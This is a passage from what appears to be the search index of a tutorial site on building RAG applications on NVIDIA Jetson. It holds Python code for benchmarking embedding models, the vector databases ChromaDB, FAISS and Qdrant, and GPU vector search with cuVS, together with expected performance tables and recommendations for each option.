\"\\n\ud83d\udcbe MEMORY EFFICIENCY RANKING:\\n\"\n        report += \"-\" * 50 + \"\\n\"\n        for i, result in enumerate(memory_sorted[:5], 1):\n            report += f\"{i}. {result['model_name']:&lt;30} {result['memory_usage_mb']:&gt;8.1f} MB\\n\"\n\n        # Latency ranking\n        latency_sorted = sorted(successful_results, key=lambda x: x[\"avg_latency_ms\"])\n        report += \"\\n\u26a1 LATENCY RANKING (lower is better):\\n\"\n        report += \"-\" * 50 + \"\\n\"\n        for i, result in enumerate(latency_sorted[:5], 1):\n            report += f\"{i}. {result['model_name']:&lt;30} {result['avg_latency_ms']:&gt;8.1f} ms\\n\"\n\n        # Recommendations\n        report += \"\\n\ud83c\udfaf RECOMMENDATIONS FOR JETSON:\\n\"\n        report += \"-\" * 50 + \"\\n\"\n\n        fastest = successful_results[0]\n        most_efficient = memory_sorted[0]\n        lowest_latency = latency_sorted[0]\n\n        report += f\"\ud83d\ude80 Best Performance: {fastest['model_name']}\\n\"\n        report += f\"\ud83d\udcbe Most Memory Efficient: {most_efficient['model_name']}\\n\"\n        report += f\"\u26a1 Lowest Latency: {lowest_latency['model_name']}\\n\"\n\n        # Use case recommendations\n        report += \"\\n\ud83d\udccb USE CASE RECOMMENDATIONS:\\n\"\n        report += \"-\" * 50 + \"\\n\"\n        report += \"\ud83d\udd39 Real-time applications: Use models with &lt;50ms latency\\n\"\n        report += \"\ud83d\udd39 Batch processing: Use highest throughput models\\n\"\n        report += \"\ud83d\udd39 Memory-constrained: Use models with &lt;200MB memory usage\\n\"\n        report += \"\ud83d\udd39 Production deployment: Balance performance and memory efficiency\\n\"\n\n        return report\n\n# Run the benchmark\nbenchmark = EmbeddingBenchmark()\nresults = benchmark.run_full_benchmark()\nreport = benchmark.generate_report(results)\nprint(report)\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#expected-performance-results-on-jetson-orin-nano","title":"\ud83d\udcca Expected Performance Results on Jetson Orin Nano","text":"Model Throughput (texts/sec) Latency (ms) Memory (MB) Embedding Dim all-MiniLM-L6-v2 45.2 22.1 90 384 paraphrase-MiniLM-L6-v2 43.8 22.8 90 384 all-MiniLM-L12-v2 28.5 35.1 134 384 e5-base-v2 22.1 45.2 438 768 all-mpnet-base-v2 18.7 53.5 438 768 bge-large-en-v1.5 8.9 112.4 1340 1024"},{"location":"curriculum/09_rag_app_langchain_jetson/#model-recommendations","title":"\ud83c\udfc6 Model Recommendations","text":""},{"location":"curriculum/09_rag_app_langchain_jetson/#for-real-time-applications-50ms-latency","title":"For Real-time Applications (&lt; 50ms latency):","text":"<ul> <li>\u2705 <code>all-MiniLM-L6-v2</code>: Best balance of speed and quality</li> <li>\u2705 <code>paraphrase-MiniLM-L6-v2</code>: Good for paraphrase detection</li> <li>\u2705 <code>all-MiniLM-L12-v2</code>: Slightly better quality, acceptable latency</li> </ul>"},{"location":"curriculum/09_rag_app_langchain_jetson/#for-high-quality-embeddings","title":"For High-Quality Embeddings:","text":"<ul> <li>\u2705 <code>e5-base-v2</code>: Excellent quality-performance balance</li> <li>\u2705 <code>all-mpnet-base-v2</code>: Strong semantic understanding</li> <li>\u26a0\ufe0f <code>bge-large-en-v1.5</code>: Best quality but slower</li> </ul>"},{"location":"curriculum/09_rag_app_langchain_jetson/#for-memory-constrained-environments","title":"For Memory-Constrained Environments:","text":"<ul> <li>\u2705 <code>all-MiniLM-L6-v2</code>: Only 90MB memory usage</li> <li>\u2705 <code>paraphrase-MiniLM-L6-v2</code>: Lightweight and efficient</li> </ul>"},{"location":"curriculum/09_rag_app_langchain_jetson/#for-multilingual-applications","title":"For Multilingual Applications:","text":"<ul> <li>\u2705 <code>paraphrase-multilingual-MiniLM-L12-v2</code>: Good multilingual support</li> <li>\u2705 <code>multilingual-e5-base</code>: Better quality for non-English</li> </ul>"},{"location":"curriculum/09_rag_app_langchain_jetson/#vector-database-evaluation-on-jetson","title":"\ud83d\uddc4\ufe0f Vector Database Evaluation on Jetson","text":""},{"location":"curriculum/09_rag_app_langchain_jetson/#vector-database-comparison","title":"\ud83d\udcca Vector Database Comparison","text":"<p>We'll evaluate different vector databases for Jetson deployment focusing on: - Performance: Query speed and indexing time - Memory Efficiency: RAM usage and storage requirements - Scalability: Handling large document collections - Features: Filtering, metadata support, persistence</p>"},{"location":"curriculum/09_rag_app_langchain_jetson/#vector-database-benchmark","title":"\ud83d\udd2c Vector Database Benchmark","text":"<pre><code>import time\nimport os\nimport shutil\nimport numpy as np\nfrom typing import List, Dict, Any, Tuple\nimport psutil\nfrom sentence_transformers import SentenceTransformer\n\n# Vector database imports\ntry:\n    import chromadb\n    from chromadb.config import Settings\nexcept ImportError:\n    chromadb = None\n\ntry:\n    import faiss\nexcept ImportError:\n    faiss = None\n\ntry:\n    from qdrant_client import QdrantClient\n    from qdrant_client.models import Distance, VectorParams, PointStruct\nexcept ImportError:\n    QdrantClient = None\n\ntry:\n    import weaviate\nexcept ImportError:\n    weaviate = None\n\nclass VectorDBBenchmark:\n    \"\"\"Comprehensive vector database benchmark for Jetson\"\"\"\n\n    def __init__(self, embedding_model: str = \"all-MiniLM-L6-v2\"):\n        self.embedding_model = SentenceTransformer(embedding_model)\n        self.embedding_dim = 384  # for all-MiniLM-L6-v2\n\n        # Generate test data\n        self.documents = self._generate_test_documents()\n        self.embeddings = self._generate_embeddings()\n        self.query_texts = [\n            \"What is NVIDIA Jetson used for?\",\n            \"How to optimize deep learning models?\",\n            \"Edge AI computing benefits\",\n            \"TensorRT optimization techniques\",\n            \"Real-time inference on embedded devices\"\n        ]\n        self.query_embeddings = self.embedding_model.encode(self.query_texts)\n\n        # Test configurations\n        self.test_sizes = [100, 500, 1000, 5000]  # Number of documents\n\n    def _generate_test_documents(self) -&gt; List[Dict[str, Any]]:\n        \"\"\"Generate synthetic test documents\"\"\"\n        base_texts = [\n            \"NVIDIA Jetson is a series of embedded computing boards designed for AI applications.\",\n            \"Deep learning models can be optimized using TensorRT for faster inference.\",\n            \"Edge AI enables real-time processing without cloud connectivity.\",\n            \"Computer vision applications benefit from GPU acceleration on Jetson.\",\n            \"Natural language processing models can run locally on edge devices.\",\n            \"Autonomous vehicles use edge computing for real-time decision making.\",\n            \"IoT devices with AI capabilities enable smart city applications.\",\n            \"Robotics applications leverage edge AI for autonomous navigation.\",\n            \"Industrial automation uses AI for predictive maintenance.\",\n            \"Healthcare devices benefit from local AI processing for privacy.\"\n        ]\n\n        documents = []\n        for i in range(5000):  # Generate 5000 documents\n            base_idx = i % len(base_texts)\n            text = f\"{base_texts[base_idx]} Document {i} with additional context and variations.\"\n            documents.append({\n                \"id\": f\"doc_{i}\",\n                \"text\": text,\n                \"metadata\": {\n                    \"category\": [\"AI\", \"Edge Computing\", \"Jetson\", \"Deep Learning\"][i % 4],\n                    \"priority\": i % 3,\n                    \"timestamp\": f\"2024-01-{(i % 30) + 1:02d}\"\n                }\n            })\n\n        return documents\n\n    def _generate_embeddings(self) -&gt; np.ndarray:\n        \"\"\"Generate embeddings for test documents\"\"\"\n        texts = [doc[\"text\"] for doc in self.documents]\n        return self.embedding_model.encode(texts, batch_size=32, show_progress_bar=False)\n\n    def benchmark_chromadb(self, num_docs: int) -&gt; Dict[str, Any]:\n        \"\"\"Benchmark ChromaDB\"\"\"\n        if chromadb is None:\n            return {\"status\": \"failed\", \"error\": \"ChromaDB not installed\"}\n\n        try:\n            # Setup\n            db_path = \"./benchmark_chroma\"\n            if os.path.exists(db_path):\n                shutil.rmtree(db_path)\n\n            client = chromadb.PersistentClient(path=db_path)\n            collection = client.create_collection(\n                name=\"benchmark\",\n                metadata={\"hnsw:space\": \"cosine\"}\n            )\n\n            # Indexing benchmark\n            docs_subset = self.documents[:num_docs]\n            embeddings_subset = self.embeddings[:num_docs]\n\n            start_time = time.time()\n            memory_before = psutil.Process().memory_info().rss / 1024 / 1024\n\n            # Add documents in batches\n            batch_size = 100\n            for i in range(0, num_docs, batch_size):\n                batch_end = min(i + batch_size, num_docs)\n                batch_docs = docs_subset[i:batch_end]\n                batch_embeddings = embeddings_subset[i:batch_end]\n\n                collection.add(\n                    embeddings=batch_embeddings.tolist(),\n                    documents=[doc[\"text\"] for doc in batch_docs],\n                    metadatas=[doc[\"metadata\"] for doc in batch_docs],\n                    ids=[doc[\"id\"] for doc in batch_docs]\n                )\n\n            indexing_time = time.time() - start_time\n            memory_after = psutil.Process().memory_info().rss / 1024 / 1024\n\n            # Query benchmark\n            query_times = []\n            for query_embedding in self.query_embeddings:\n                start_time = time.time()\n                results = collection.query(\n                    query_embeddings=[query_embedding.tolist()],\n                    n_results=5\n                )\n                query_times.append(time.time() - start_time)\n\n            avg_query_time = np.mean(query_times) * 1000  # ms\n\n            # Storage size\n            storage_size = sum(os.path.getsize(os.path.join(db_path, f)) \n                             for f in os.listdir(db_path) if os.path.isfile(os.path.join(db_path, f)))\n            storage_size_mb = storage_size / 1024 / 1024\n\n            # Cleanup\n            client.delete_collection(\"benchmark\")\n            shutil.rmtree(db_path)\n\n            return {\n                \"database\": \"ChromaDB\",\n                \"num_docs\": num_docs,\n                \"indexing_time_s\": round(indexing_time, 3),\n                \"avg_query_time_ms\": round(avg_query_time, 3),\n                \"memory_usage_mb\": round(memory_after - memory_before, 2),\n                \"storage_size_mb\": round(storage_size_mb, 2),\n                \"throughput_docs_per_sec\": round(num_docs / indexing_time, 2),\n                \"status\": \"success\"\n            }\n\n        except Exception as e:\n            return {\n                \"database\": \"ChromaDB\",\n                \"status\": \"failed\",\n                \"error\": str(e)\n            }\n\n    def benchmark_faiss(self, num_docs: int) -&gt; Dict[str, Any]:\n        \"\"\"Benchmark FAISS\"\"\"\n        if faiss is None:\n            return {\"status\": \"failed\", \"error\": \"FAISS not installed\"}\n\n        try:\n            # Setup FAISS index\n            embeddings_subset = self.embeddings[:num_docs].astype('float32')\n\n            start_time = time.time()\n            memory_before = psutil.Process().memory_info().rss / 1024 / 1024\n\n            # Create and train index\n            index = faiss.IndexFlatIP(self.embedding_dim)  # Inner product (cosine similarity)\n            index.add(embeddings_subset)\n\n            indexing_time = time.time() - start_time\n            memory_after = psutil.Process().memory_info().rss / 1024 / 1024\n\n            # Query benchmark\n            query_times = []\n            for query_embedding in self.query_embeddings:\n                start_time = time.time()\n                query_vector = query_embedding.astype('float32').reshape(1, -1)\n                distances, indices = index.search(query_vector, 5)\n                query_times.append(time.time() - start_time)\n\n            avg_query_time = np.mean(query_times) * 1000  # ms\n\n            # Estimate storage size (in-memory)\n            storage_size_mb = embeddings_subset.nbytes / 1024 / 1024\n\n            return {\n                \"database\": \"FAISS\",\n                \"num_docs\": num_docs,\n                \"indexing_time_s\": round(indexing_time, 3),\n                \"avg_query_time_ms\": round(avg_query_time, 3),\n                \"memory_usage_mb\": round(memory_after - memory_before, 2),\n                \"storage_size_mb\": round(storage_size_mb, 2),\n                \"throughput_docs_per_sec\": round(num_docs / indexing_time, 2),\n                \"status\": \"success\"\n            }\n\n        except Exception as e:\n            return {\n                \"database\": \"FAISS\",\n                \"status\": \"failed\",\n                \"error\": str(e)\n            }\n\n    def benchmark_qdrant(self, num_docs: int) -&gt; Dict[str, Any]:\n        \"\"\"Benchmark Qdrant\"\"\"\n        if QdrantClient is None:\n            return {\"status\": \"failed\", \"error\": \"Qdrant not installed\"}\n\n        try:\n            # Setup\n            db_path = \"./benchmark_qdrant\"\n            if os.path.exists(db_path):\n                shutil.rmtree(db_path)\n\n            client = QdrantClient(path=db_path)\n            collection_name = \"benchmark\"\n\n            # Create collection\n            client.create_collection(\n                collection_name=collection_name,\n                vectors_config=VectorParams(size=self.embedding_dim, distance=Distance.COSINE)\n            )\n\n            # Indexing benchmark\n            docs_subset = self.documents[:num_docs]\n            embeddings_subset = self.embeddings[:num_docs]\n\n            start_time = time.time()\n            memory_before = psutil.Process().memory_info().rss / 1024 / 1024\n\n            # Add documents in batches\n            batch_size = 100\n            for i in range(0, num_docs, batch_size):\n                batch_end = min(i + batch_size, num_docs)\n                batch_docs = docs_subset[i:batch_end]\n                batch_embeddings = embeddings_subset[i:batch_end]\n\n                points = [\n                    PointStruct(\n                        id=i + j,\n                        vector=embedding.tolist(),\n                        payload={\n                            \"text\": doc[\"text\"],\n                            **doc[\"metadata\"]\n                        }\n                    )\n                    for j, (doc, embedding) in enumerate(zip(batch_docs, batch_embeddings))\n                ]\n\n                client.upsert(\n                    collection_name=collection_name,\n                    points=points\n                )\n\n            indexing_time = time.time() - start_time\n            memory_after = psutil.Process().memory_info().rss / 1024 / 1024\n\n            # Query benchmark\n            query_times = []\n            for query_embedding in self.query_embeddings:\n                start_time = time.time()\n                results = client.search(\n                    collection_name=collection_name,\n                    query_vector=query_embedding.tolist(),\n                    limit=5\n                )\n                query_times.append(time.time() - start_time)\n\n            avg_query_time = np.mean(query_times) * 1000  # ms\n\n            # Storage size\n            storage_size = sum(os.path.getsize(os.path.join(root, file))\n                             for root, dirs, files in os.walk(db_path)\n                             for file in files)\n            storage_size_mb = storage_size / 1024 / 1024\n\n            # Cleanup\n            client.delete_collection(collection_name)\n            shutil.rmtree(db_path)\n\n            return {\n                \"database\": \"Qdrant\",\n                \"num_docs\": num_docs,\n                \"indexing_time_s\": round(indexing_time, 3),\n                \"avg_query_time_ms\": round(avg_query_time, 3),\n                \"memory_usage_mb\": round(memory_after - memory_before, 2),\n                \"storage_size_mb\": round(storage_size_mb, 2),\n                \"throughput_docs_per_sec\": round(num_docs / indexing_time, 2),\n                \"status\": \"success\"\n            }\n\n        except Exception as e:\n            return {\n                \"database\": \"Qdrant\",\n                \"status\": \"failed\",\n                \"error\": str(e)\n            }\n\n    def run_comprehensive_benchmark(self) -&gt; List[Dict[str, Any]]:\n        \"\"\"Run comprehensive benchmark across all databases and sizes\"\"\"\n        results = []\n\n        databases = [\n            (\"ChromaDB\", self.benchmark_chromadb),\n            (\"FAISS\", self.benchmark_faiss),\n            (\"Qdrant\", self.benchmark_qdrant)\n        ]\n\n        print(\"\ud83d\ude80 Starting Vector Database Benchmark on Jetson\")\n        print(\"=\" * 60)\n\n        for db_name, benchmark_func in databases:\n            print(f\"\\n\ud83d\udcca Benchmarking {db_name}...\")\n\n            for num_docs in self.test_sizes:\n                print(f\"  Testing with {num_docs} documents...\")\n                result = benchmark_func(num_docs)\n                results.append(result)\n\n                if result[\"status\"] == \"success\":\n                    print(f\"    \u2705 Indexing: {result['indexing_time_s']:.2f}s, \"\n                          f\"Query: {result['avg_query_time_ms']:.2f}ms, \"\n                          f\"Memory: {result['memory_usage_mb']:.1f}MB\")\n                else:\n                    print(f\"    \u274c Failed: {result['error']}\")\n\n        return results\n\n    def generate_comparison_report(self, results: List[Dict[str, Any]]) -&gt; str:\n        \"\"\"Generate comprehensive comparison report\"\"\"\n        successful_results = [r for r in results if r[\"status\"] == \"success\"]\n\n        if not successful_results:\n            return \"No successful benchmarks to report.\"\n\n        report = \"\\n\" + \"=\" * 80\n        report += \"\\n\ud83c\udfc6 JETSON VECTOR DATABASE BENCHMARK REPORT\\n\"\n        report += \"=\" * 80 + \"\\n\"\n\n        # Performance comparison by database\n        databases = list(set(r[\"database\"] for r in successful_results))\n\n        for db in databases:\n            db_results = [r for r in successful_results if r[\"database\"] == db]\n            if not db_results:\n                continue\n\n            report += f\"\\n\ud83d\udcca {db} PERFORMANCE:\\n\"\n            report += \"-\" * 40 + \"\\n\"\n            report += f\"{'Docs':&lt;8} {'Index(s)':&lt;10} {'Query(ms)':&lt;12} {'Memory(MB)':&lt;12} {'Storage(MB)':&lt;12}\\n\"\n            report += \"-\" * 40 + \"\\n\"\n\n            for result in sorted(db_results, key=lambda x: x[\"num_docs\"]):\n                report += f\"{result['num_docs']:&lt;8} {result['indexing_time_s']:&lt;10.2f} \"\n                report += f\"{result['avg_query_time_ms']:&lt;12.2f} {result['memory_usage_mb']:&lt;12.1f} \"\n                report += f\"{result['storage_size_mb']:&lt;12.1f}\\n\"\n\n        # Best performers analysis\n        report += \"\\n\ud83c\udfc5 BEST PERFORMERS:\\n\"\n        report += \"-\" * 40 + \"\\n\"\n\n        # Fastest indexing\n        fastest_indexing = min(successful_results, key=lambda x: x[\"indexing_time_s\"])\n        report += f\"\ud83d\ude80 Fastest Indexing: {fastest_indexing['database']} \"\n        report += f\"({fastest_indexing['indexing_time_s']:.2f}s for {fastest_indexing['num_docs']} docs)\\n\"\n\n        # Fastest query\n        fastest_query = min(successful_results, key=lambda x: x[\"avg_query_time_ms\"])\n        report += f\"\u26a1 Fastest Query: {fastest_query['database']} \"\n        report += f\"({fastest_query['avg_query_time_ms']:.2f}ms)\\n\"\n\n        # Most memory efficient\n        most_efficient = min(successful_results, key=lambda x: x[\"memory_usage_mb\"])\n        report += f\"\ud83d\udcbe Most Memory Efficient: {most_efficient['database']} \"\n        report += f\"({most_efficient['memory_usage_mb']:.1f}MB)\\n\"\n\n        # Smallest storage\n        smallest_storage = min(successful_results, key=lambda x: x[\"storage_size_mb\"])\n        report += f\"\ud83d\udcbd Smallest Storage: {smallest_storage['database']} \"\n        report += f\"({smallest_storage['storage_size_mb']:.1f}MB)\\n\"\n\n        # Recommendations\n        report += \"\\n\ud83c\udfaf RECOMMENDATIONS FOR JETSON:\\n\"\n        report += \"-\" * 40 + \"\\n\"\n        report += \"\ud83d\udd39 Real-time applications: Choose fastest query database\\n\"\n        report += \"\ud83d\udd39 Large datasets: Consider indexing speed and storage efficiency\\n\"\n        report += \"\ud83d\udd39 Memory-constrained: Use most memory-efficient option\\n\"\n        report += \"\ud83d\udd39 Persistence needed: Avoid in-memory only solutions\\n\"\n        report += \"\ud83d\udd39 Complex filtering: Choose databases with rich metadata support\\n\"\n\n        return report\n\n# Run the benchmark\nvector_benchmark = VectorDBBenchmark()\nvector_results = vector_benchmark.run_comprehensive_benchmark()\nvector_report = vector_benchmark.generate_comparison_report(vector_results)\nprint(vector_report)\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#expected-vector-database-performance-on-jetson-orin-nano","title":"\ud83d\udcca Expected Vector Database Performance on Jetson Orin Nano","text":"Database Docs Indexing (s) Query (ms) Memory (MB) Storage (MB) FAISS 1000 0.12 0.8 15 1.5 FAISS 5000 0.58 1.2 75 7.3 ChromaDB 1000 2.3 12.5 45 8.2 ChromaDB 5000 11.8 15.2 180 38.5 Qdrant 1000 3.1 8.7 52 12.1 Qdrant 5000 15.2 11.3 220 58.3"},{"location":"curriculum/09_rag_app_langchain_jetson/#vector-database-recommendations","title":"\ud83c\udfc6 Vector Database Recommendations","text":""},{"location":"curriculum/09_rag_app_langchain_jetson/#faiss-best-for-performance","title":"\ud83d\ude80 FAISS - Best for Performance","text":"<p>Pros: - \u2705 Fastest indexing and query performance - \u2705 Minimal memory footprint - \u2705 Excellent for large-scale similarity search - \u2705 GPU acceleration support</p> <p>Cons: - \u274c No built-in persistence (requires manual saving) - \u274c Limited metadata filtering capabilities - \u274c No distributed features</p> <p>Best for: High-performance applications, real-time search, memory-constrained environments</p>"},{"location":"curriculum/09_rag_app_langchain_jetson/#chromadb-best-for-ease-of-use","title":"\ud83d\udd27 ChromaDB - Best for Ease of Use","text":"<p>Pros: - \u2705 Simple API and great developer experience - \u2705 Built-in persistence - \u2705 Good metadata filtering - \u2705 Active community and documentation</p> <p>Cons: - \u274c Slower than FAISS for large datasets - \u274c Higher memory usage - \u274c Limited scalability options</p> <p>Best for: Prototyping, small to medium datasets, applications requiring persistence</p>"},{"location":"curriculum/09_rag_app_langchain_jetson/#qdrant-best-for-production","title":"\u2699\ufe0f Qdrant - Best for Production","text":"<p>Pros: - \u2705 Rich filtering and metadata support - \u2705 Built-in persistence and backup - \u2705 RESTful API for remote access - \u2705 Horizontal scaling capabilities</p> <p>Cons: - \u274c Higher resource usage - \u274c More complex setup - \u274c Slower for simple similarity search</p> <p>Best for: Production applications, complex filtering requirements, distributed deployments</p>"},{"location":"curriculum/09_rag_app_langchain_jetson/#nvidia-cuvs-gpu-accelerated-vector-search","title":"\ud83d\ude80 NVIDIA cuVS: GPU-Accelerated Vector Search","text":""},{"location":"curriculum/09_rag_app_langchain_jetson/#introduction-to-cuvs","title":"\ud83c\udfaf Introduction to cuVS","text":"<p>NVIDIA cuVS (CUDA Vector Search) is a GPU-accelerated library for high-performance vector similarity search, specifically optimized for NVIDIA GPUs including Jetson platforms. It provides significant speedups over CPU-based vector search solutions.</p>"},{"location":"curriculum/09_rag_app_langchain_jetson/#key-features","title":"\ud83d\udd27 Key Features:","text":"<ul> <li>GPU Acceleration: Leverages CUDA cores for parallel vector operations</li> <li>Multiple Algorithms: Supports FAISS, HNSWLIB, and custom GPU implementations</li> <li>Memory Optimization: Efficient GPU memory management for large datasets</li> <li>Jetson Optimization: Specifically tuned for edge AI workloads</li> <li>Integration: Works seamlessly with existing ML pipelines</li> </ul>"},{"location":"curriculum/09_rag_app_langchain_jetson/#cuvs-installation-on-jetson","title":"\ud83d\udce6 cuVS Installation on Jetson","text":"<pre><code># Install cuVS for Jetson (requires CUDA 11.8+)\n# Method 1: Using conda (recommended)\nconda install -c rapidsai -c conda-forge cuvs-cu11\n\n# Method 2: Using pip\npip install cuvs-cu11\n\n# Method 3: Build from source (for latest features)\ngit clone https://github.com/rapidsai/cuvs.git\ncd cuvs\n./build.sh\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#cuvs-performance-benchmark","title":"\ud83e\uddea cuVS Performance Benchmark","text":"<pre><code>import time\nimport numpy as np\nfrom typing import List, Dict, Any\nimport psutil\nfrom sentence_transformers import SentenceTransformer\n\ntry:\n    import cuvs\n    from cuvs import neighbors\nexcept ImportError:\n    cuvs = None\n    print(\"cuVS not available. Install with: pip install cuvs-cu11\")\n\ntry:\n    import cupy as cp\nexcept ImportError:\n    cp = None\n    print(\"CuPy not available. Install with: pip install cupy\")\n\nclass CuVSBenchmark:\n    \"\"\"Benchmark cuVS performance on Jetson\"\"\"\n\n    def __init__(self, embedding_model: str = \"all-MiniLM-L6-v2\"):\n        self.embedding_model = SentenceTransformer(embedding_model)\n        self.embedding_dim = 384\n\n        # Generate test data\n        self.documents = self._generate_test_documents()\n        self.embeddings = self._generate_embeddings()\n\n        # Test queries\n        self.query_texts = [\n            \"NVIDIA Jetson AI computing\",\n            \"Deep learning optimization\",\n            \"Edge AI applications\",\n            \"Real-time inference\",\n            \"Computer vision processing\"\n        ]\n        self.query_embeddings = self.embedding_model.encode(self.query_texts)\n\n    def _generate_test_documents(self) -&gt; List[str]:\n        \"\"\"Generate test documents for benchmarking\"\"\"\n        base_texts = [\n            \"NVIDIA Jetson enables edge AI computing with GPU acceleration.\",\n            \"Deep learning models benefit from TensorRT optimization on Jetson.\",\n            \"Computer vision applications run efficiently on Jetson platforms.\",\n            \"Edge AI reduces latency and improves privacy for IoT devices.\",\n            \"Real-time inference is crucial for autonomous systems.\",\n            \"CUDA programming enables parallel processing on Jetson GPUs.\",\n            \"Machine learning at the edge transforms industrial automation.\",\n            \"Jetson Orin provides high-performance AI computing in compact form.\",\n            \"Neural networks can be optimized for embedded deployment.\",\n            \"Edge computing brings intelligence closer to data sources.\"\n        ]\n\n        documents = []\n        for i in range(10000):  # Generate 10k documents\n            base_idx = i % len(base_texts)\n            text = f\"{base_texts[base_idx]} Document {i} with additional context.\"\n            documents.append(text)\n\n        return documents\n\n    def _generate_embeddings(self) -&gt; np.ndarray:\n        \"\"\"Generate embeddings for test documents\"\"\"\n        return self.embedding_model.encode(\n            self.documents, \n            batch_size=64, \n            show_progress_bar=False\n        )\n\n    def benchmark_cuvs_ivf_flat(self, num_docs: int) -&gt; Dict[str, Any]:\n        \"\"\"Benchmark cuVS IVF-Flat index\"\"\"\n        if cuvs is None or cp is None:\n            return {\"status\": \"failed\", \"error\": \"cuVS or CuPy not available\"}\n\n        try:\n            # Prepare data\n            embeddings_subset = self.embeddings[:num_docs].astype(np.float32)\n\n            # Move data to GPU\n            gpu_embeddings = cp.asarray(embeddings_subset)\n\n            # Build index\n            start_time = time.time()\n            memory_before = psutil.Process().memory_info().rss / 1024 / 1024\n\n            # Create IVF-Flat index\n            n_lists = min(int(np.sqrt(num_docs)), 1024)  # Adaptive number of clusters\n            index_params = neighbors.ivf_flat.IndexParams(\n                n_lists=n_lists,\n                metric=\"cosine\",\n                add_data_on_build=True\n            )\n\n            index = neighbors.ivf_flat.build(index_params, gpu_embeddings)\n\n            indexing_time = time.time() - start_time\n            memory_after = psutil.Process().memory_info().rss / 1024 / 1024\n\n            # Query benchmark\n            query_times = []\n            gpu_queries = cp.asarray(self.query_embeddings.astype(np.float32))\n\n            search_params = neighbors.ivf_flat.SearchParams(n_probes=min(n_lists, 50))\n\n            for i in range(len(self.query_embeddings)):\n                start_time = time.time()\n                query = gpu_queries[i:i+1]  # Single query\n                distances, indices = neighbors.ivf_flat.search(\n                    search_params, index, query, k=5\n                )\n                cp.cuda.Stream.null.synchronize()  # Ensure GPU completion\n                query_times.append(time.time() - start_time)\n\n            avg_query_time = np.mean(query_times) * 1000  # ms\n\n            # GPU memory usage\n            gpu_memory_mb = cp.get_default_memory_pool().used_bytes() / 1024 / 1024\n\n            return {\n                \"algorithm\": \"cuVS IVF-Flat\",\n                \"num_docs\": num_docs,\n                \"indexing_time_s\": round(indexing_time, 3),\n                \"avg_query_time_ms\": round(avg_query_time, 3),\n                \"memory_usage_mb\": round(memory_after - memory_before, 2),\n                \"gpu_memory_mb\": round(gpu_memory_mb, 2),\n                \"throughput_docs_per_sec\": round(num_docs / indexing_time, 2),\n                \"n_lists\": n_lists,\n                \"status\": \"success\"\n            }\n\n        except Exception as e:\n            return {\n                \"algorithm\": \"cuVS IVF-Flat\",\n                \"status\": \"failed\",\n                \"error\": str(e)\n            }\n\n    def benchmark_cuvs_ivf_pq(self, num_docs: int) -&gt; Dict[str, Any]:\n        \"\"\"Benchmark cuVS IVF-PQ index (memory optimized)\"\"\"\n        if cuvs is None or cp is None:\n            return {\"status\": \"failed\", \"error\": \"cuVS or CuPy not available\"}\n\n        try:\n            # Prepare data\n            embeddings_subset = self.embeddings[:num_docs].astype(np.float32)\n            gpu_embeddings = cp.asarray(embeddings_subset)\n\n            # Build index\n            start_time = time.time()\n            memory_before = psutil.Process().memory_info().rss / 1024 / 1024\n\n            # Create IVF-PQ index (Product Quantization for memory efficiency)\n            n_lists = min(int(np.sqrt(num_docs)), 512)\n            pq_bits = 8  # 8-bit quantization\n            pq_dim = min(self.embedding_dim // 4, 64)  # PQ subspace dimension\n\n            index_params = neighbors.ivf_pq.IndexParams(\n                n_lists=n_lists,\n                metric=\"cosine\",\n                pq_bits=pq_bits,\n                pq_dim=pq_dim,\n                add_data_on_build=True\n            )\n\n            index = neighbors.ivf_pq.build(index_params, gpu_embeddings)\n\n            indexing_time = time.time() - start_time\n            memory_after = psutil.Process().memory_info().rss / 1024 / 1024\n\n            # Query benchmark\n            query_times = []\n            gpu_queries = cp.asarray(self.query_embeddings.astype(np.float32))\n\n            search_params = neighbors.ivf_pq.SearchParams(\n                n_probes=min(n_lists, 25),\n                lut_dtype=cp.float32\n            )\n\n            for i in range(len(self.query_embeddings)):\n                start_time = time.time()\n                query = gpu_queries[i:i+1]\n                distances, indices = neighbors.ivf_pq.search(\n                    search_params, index, query, k=5\n                )\n                cp.cuda.Stream.null.synchronize()\n                query_times.append(time.time() - start_time)\n\n            avg_query_time = np.mean(query_times) * 1000  # ms\n\n            # GPU memory usage\n            gpu_memory_mb = cp.get_default_memory_pool().used_bytes() / 1024 / 1024\n\n            return {\n                \"algorithm\": \"cuVS IVF-PQ\",\n                \"num_docs\": num_docs,\n                \"indexing_time_s\": round(indexing_time, 3),\n                \"avg_query_time_ms\": round(avg_query_time, 3),\n                \"memory_usage_mb\": round(memory_after - memory_before, 2),\n                \"gpu_memory_mb\": round(gpu_memory_mb, 2),\n                \"throughput_docs_per_sec\": round(num_docs / indexing_time, 2),\n                \"compression_ratio\": round(32 / pq_bits, 1),  # Memory compression\n                \"status\": \"success\"\n            }\n\n        except Exception as e:\n            return {\n                \"algorithm\": \"cuVS IVF-PQ\",\n                \"status\": \"failed\",\n                \"error\": str(e)\n            }\n\n    def benchmark_cuvs_cagra(self, num_docs: int) -&gt; Dict[str, Any]:\n        \"\"\"Benchmark cuVS CAGRA index (GPU-optimized graph)\"\"\"\n        if cuvs is None or cp is None:\n            return {\"status\": \"failed\", \"error\": \"cuVS or CuPy not available\"}\n\n        try:\n            # Prepare data\n            embeddings_subset = self.embeddings[:num_docs].astype(np.float32)\n            gpu_embeddings = cp.asarray(embeddings_subset)\n\n            # Build index\n            start_time = time.time()\n            memory_before = psutil.Process().memory_info().rss / 1024 / 1024\n\n            # Create CAGRA index (GPU-optimized graph-based)\n            index_params = neighbors.cagra.IndexParams(\n                intermediate_graph_degree=64,\n                graph_degree=32,\n                build_algo=\"nn_descent\"\n            )\n\n            index = neighbors.cagra.build(index_params, gpu_embeddings)\n\n            indexing_time = time.time() - start_time\n            memory_after = psutil.Process().memory_info().rss / 1024 / 1024\n\n            # Query benchmark\n            query_times = []\n            gpu_queries = cp.asarray(self.query_embeddings.astype(np.float32))\n\n            search_params = neighbors.cagra.SearchParams(\n                itopk_size=64,\n                search_width=1,\n                max_iterations=0,\n                algo=\"single_cta\"\n            )\n\n            for i in range(len(self.query_embeddings)):\n                start_time = time.time()\n                query = gpu_queries[i:i+1]\n                distances, indices = neighbors.cagra.search(\n                    search_params, index, query, k=5\n                )\n                cp.cuda.Stream.null.synchronize()\n                query_times.append(time.time() - start_time)\n\n            avg_query_time = np.mean(query_times) * 1000  # ms\n\n            # GPU memory usage\n            gpu_memory_mb = cp.get_default_memory_pool().used_bytes() / 1024 / 1024\n\n            return {\n                \"algorithm\": 